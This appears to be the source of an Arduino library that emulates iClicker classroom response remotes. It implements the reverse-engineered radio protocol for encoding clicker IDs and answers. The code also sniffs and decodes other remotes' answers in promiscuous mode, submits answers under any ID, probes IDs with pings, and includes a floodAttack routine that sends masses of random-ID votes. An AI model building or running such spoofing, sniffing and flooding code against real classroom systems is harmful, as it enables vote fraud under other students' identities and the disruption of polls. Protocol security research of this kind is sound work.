#include "iClickerEmulator.h"
#include <string.h>

iClickerEmulator *iClickerEmulator::_self;

iClickerEmulator::iClickerEmulator(uint8_t _cspin, uint8_t _irqpin, uint8_t _irqnum)
: _radio(_cspin, _irqpin, false, _irqnum)
{
    _recvCallback = NULL;
    _self = this; //this sucks
    _radio.setRecvCallback(&isrRecvCallback);
}

bool iClickerEmulator::begin(iClickerChannel_t chan)
{
    //seed rand
    randomSeed(analogRead(0) + analogRead(1) + analogRead(2));

    _radio.initialize();
    _radio.setChannel(chan);
    configureRadio(CHANNEL_SEND, DEFAULT_SEND_SYNC_ADDR);

    return true;
}


uint8_t iClickerEmulator::encodeAns(uint8_t id[ICLICKER_ID_LEN], iClickerAnswer_t ans)
{
    uint8_t x = 1;
    uint8_t encoded_id[ICLICKER_ID_LEN];

    if (ans >= NUM_ANSWER_CHOICES)
        return 0;

    encodeId(id, encoded_id);

    for (uint8_t i=0; i < ICLICKER_ID_LEN; i++)
        x += encoded_id[i];


    return x + answerOffsets[ans];
}


iClickerAnswer_t iClickerEmulator::decodeAns(uint8_t id[ICLICKER_ID_LEN], uint8_t encoded)
{
    uint8_t x = 1;

    uint8_t encoded_id[ICLICKER_ID_LEN];
    encodeId(id, encoded_id);

    for (uint8_t i=0; i < ICLICKER_ID_LEN; i++)
        x += encoded_id[i];

    encoded -= x;

    for (uint8_t i=0; i < NUM_ANSWER_CHOICES; i++)
    {
        if (answerOffsets[i] == encoded)
            return (iClickerAnswer_t)i;
    }

    return ANSWER_A;
}


void iClickerEmulator::encodeId(uint8_t *id, uint8_t *ret)
{
    //bits 4-0
    ret[0] = ((id[0] >> 5) & 0x4) | ((id[0]<<3) & 0xf8) | (id[1] >> 7);
    ret[1] = ((id[1] << 1) & 0xfc) | ((id[0] >> 6) & 0x01);
    ret[2] = (id[1] << 7) | ((id[0] >> 5) & 0x01) | ((id[2] >> 1) & 0x7c);
    ret[3] = ((id[2] & 0x7) << 5) | ((id[2] & 0x1) << 4);
}


void iClickerEmulator::decodeId(uint8_t *id, uint8_t *ret)
{
    ret[0] = (id[0] >> 3) | ((id[2] & 0x1) << 5) | ((id[1] & 0x1) << 6) | ((id[0] & 0x4) << 5);
    ret[1] = ((id[0] & 0x1) << 7) | (id[1] >> 1) | (id[2] >> 7);
    ret[2] = ((id[2] & 0x7c) << 1) | (id[3] >> 5);
    ret[3] = ret[0]^ret[1]^ret[2];
}


bool iClickerEmulator::validId(uint8_t *id)
{
    return (id[0]^id[1]^id[2]) == id[3];
}


void iClickerEmulator::randomId(uint8_t *ret)
{
    ret[0] = (uint8_t)random(256);
    ret[1] = (uint8_t)random(256);
    ret[2] = (uint8_t)random(256);
    ret[3] = ret[0]^ret[1]^ret[2];
}


iClickerAnswer_t iClickerEmulator::randomAnswer()
{
    const uint8_t ans[] = {
        (uint8_t)ANSWER_A,
        (uint8_t)ANSWER_B,
        (uint8_t)ANSWER_C,
        (uint8_t)ANSWER_D,
        (uint8_t)ANSWER_E
    };

    return (iClickerAnswer_t)ans[random(sizeof(ans))];
}


char iClickerEmulator::answerChar(iClickerAnswer_t ans)
{
    switch(ans)
    {
        case ANSWER_A:
            return 'A';

        case ANSWER_B:
            return 'B';

        case ANSWER_C:
            return 'C';

        case ANSWER_D:
            return 'D';

        case ANSWER_E:
            return 'E';

        case ANSWER_PING:
            return 'P';

        default:
            return 'X'; //unknown
    }
}


bool iClickerEmulator::submitAnswer(uint8_t id[ICLICKER_ID_LEN], iClickerAnswer_t ans, bool withAck, uint32_t timeout)
{
    configureRadio(CHANNEL_SEND, DEFAULT_SEND_SYNC_ADDR);

    iClickerAnswerPacket_t toSend;

    encodeId(id, toSend.id); //encode the id for transmission

    // zero out last nibble
    toSend.id[ICLICKER_ID_LEN-1] &= 0xF0;
    // add dumb redundant answer nibble
    toSend.id[ICLICKER_ID_LEN-1] |= 0x0F & answerOffsets[ans];

    toSend.answer = encodeAns(id, ans);

    //send packet, we can cast toSend to array since all uint8_t bytes
    _radio.send(&toSend, PAYLOAD_LENGTH_SEND);

    // need to determine packet format!
    if (withAck)
    {
        uint32_t start = millis();
        configureRadio(CHANNEL_RECV, id);

        bool recvd = false;
        while(millis() - start < timeout && !recvd) {
            recvd = _radio.receiveDone();
        }
        //eventually should parse response
        recvd &= (_radio.PAYLOADLEN == PAYLOAD_LENGTH_RECV);

        configureRadio(CHANNEL_SEND, DEFAULT_SEND_SYNC_ADDR);
        return recvd;
    }

    return true;
}


void iClickerEmulator::setChannel(iClickerChannel_t chan)
{
    _radio.setChannel(chan);
    configureRadio(CHANNEL_SEND, DEFAULT_SEND_SYNC_ADDR);
}


void iClickerEmulator::configureRadio(iClickerChannelType_t type, const uint8_t *syncaddr)
{
    // set the correct sync addr and len
    _radio.setSyncAddr(syncaddr, type == CHANNEL_SEND ? SEND_SYNC_ADDR_LEN : RECV_SYNC_ADDR_LEN);

    // put radio on the correct freq and packet size
    _radio.setChannelType(type);
}



// go into recv mode
void iClickerEmulator::startPromiscuous(iClickerChannelType_t chanType, void (*cb)(iClickerPacket_t *))
{
    _recvCallback = cb;
    _radio.setChannelType(chanType);
    _radio.enablePromiscuous(); //should call isr recv callback
}


void iClickerEmulator::stopPromiscuous()
{
    _recvCallback = NULL;
    _radio.disablePromiscuous();
}


// static method called when packet recvd
void iClickerEmulator::isrRecvCallback(uint8_t *buf, uint8_t numBytes)
{
    if (!_self->_recvCallback) //make sure not null
        return;

    iClickerPacket_t recvd;
    //process packet
    if (numBytes == PAYLOAD_LENGTH_SEND && _self->_radio.getChannelType() == CHANNEL_SEND) {
        //recvd from another iclicker
        iClickerAnswerPacket_t *pack = (iClickerAnswerPacket_t *)buf;
        recvd.type = PACKET_ANSWER;
        decodeId(pack->id, recvd.packet.answerPacket.id);
        recvd.packet.answerPacket.answer = decodeAns(recvd.packet.answerPacket.id, pack->answer);

    } else if (numBytes == PAYLOAD_LENGTH_RECV && _self->_radio.getChannelType() == CHANNEL_RECV) {
        //recvd from base station
        recvd.type = PACKET_RESPONSE;
        memcpy(&recvd.packet.respPacket, buf, PAYLOAD_LENGTH_RECV);
    }

    _self->_recvCallback(&recvd);
}



bool iClickerEmulator::floodAttack(uint32_t num, uint32_t interval)
{
    uint8_t id[ICLICKER_ID_LEN];
    iClickerAnswer_t ans;
    // put radio into correct mode
    configureRadio(CHANNEL_SEND, DEFAULT_SEND_SYNC_ADDR);

    for (uint32_t i=0; i < num; i++) {
        randomId(id); //get random id
        ans = randomAnswer();
        //submit answer
        if(!submitAnswer(id, ans))
            return false;

        delay(interval);
    }

    return true;
}


uint16_t iClickerEmulator::ping(uint8_t id[ICLICKER_ID_LEN], uint16_t tries, uint16_t wait)
{
    configureRadio(CHANNEL_SEND, DEFAULT_SEND_SYNC_ADDR);

    uint16_t total = 0;

    for (uint16_t i=0; i < tries; i++)
    {
        if (submitAnswer(id, ANSWER_PING, true, wait))
            total++;

    }

    return total;
}
